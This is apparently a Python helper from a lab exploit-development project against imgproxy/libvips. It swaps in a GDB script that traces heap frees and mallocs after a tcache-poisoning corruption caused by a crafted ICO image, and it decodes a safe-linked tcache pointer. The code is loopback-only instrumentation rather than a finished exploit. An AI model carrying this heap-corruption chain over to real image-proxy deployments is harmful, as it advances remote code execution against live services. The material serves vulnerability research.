#!/usr/bin/env python3
"""W10: identify the free() that aborts after the W9 wire-only tcache poison.

Loopback only. Reuses the committed W9 probe verbatim, replacing only its GDB
command script: after read_full returns, every natural free() prints its
pointer, chunk size, caller return address and a short backtrace. GDB reads
memory only; no set-writes and no forced calls.

Usage (lab paths are pinned in the W9 probe; run from anywhere):
    W8_OUTDIR=/tmp/out python3 ico_free_attribution.py TAG LOW N PRELOAD gdb SIZE BINARY

With SIZE=0x25 (the W9 default) the wire bytes rewrite the victim chunk's
size field from 0x35 to 0x25; with SIZE=0x35 that field is preserved.
"""
import importlib.util
import sys

PROBE = ("/home/mesh-home/mishe-tauftauf2shell/lab/frontier/imgproxy2shell/"
         "provision/ico_post_poison_trace.py")

GDB = """set pagination off
set confirm off
set breakpoint pending on
handle SIGPIPE nostop noprint pass
set environment IMGPROXY_BIND 127.0.0.1:18180
set environment IMGPROXY_BASE_URL http://127.0.0.1:18181/
set environment IMGPROXY_WORKERS 1
set environment IMGPROXY_CONCURRENCY 1
set environment IMGPROXY_LOG_LEVEL error
set environment IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES true
set environment LD_LIBRARY_PATH {libdir}
break vips_foreign_load_read_full if $rdx == 0xfffffff5
run
printf "GDB_HIT rdx=%p\\n", $rdx
set $dst = $rsi
set $base = $dst - 14
printf "GDB_BASE %p ACTUAL %p\\n", $base, $dst
finish
printf "GDB_RET=%p\\n", $rax
printf "GDB_TCACHE_PRE head=%p count=%d\\n", tcache->entries[1], tcache->counts[1]
set $pos = $dst + 18
set $raw = *(unsigned long long *)$pos
set $wire = (void *)($raw ^ ((unsigned long)$pos >> 12))
printf "GDB_WIRE_DECODED %p RAW %p POS %p\\n", $wire, $raw, $pos
set $poisoned = 1
break free if $poisoned
commands
silent
if $rdi != 0
printf "GDB_FREE ptr=%p chunksize=%p ret=%p thread=%d\\n", $rdi, *(unsigned long long*)($rdi-8), *(unsigned long long*)$rsp, $_thread
x/4gx $rdi-16
bt 3
end
continue
end
break malloc if $rdi == 0x20
continue
printf "GDB_M1_HIT size=%p thread=%d\\n", $rdi, $_thread
finish
printf "GDB_M1_RET %p\\n", $rax
set $h1 = tcache->entries[1]
set $c1 = tcache->counts[1]
printf "GDB_TCACHE_1 head=%p count=%d\\n", $h1, $c1
continue
printf "GDB_AFTER1 rdi=%p rip=%p\\n", $rdi, $rip
set $h2 = tcache->entries[1]
set $c2 = tcache->counts[1]
printf "GDB_TCACHE_2 head=%p count=%d\\n", $h2, $c2
finish
printf "GDB_M2_RET %p\\n", $rax
bt 5
quit
"""

spec = importlib.util.spec_from_file_location("w9probe", PROBE)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
mod.GDB = GDB
sys.exit(mod.main())
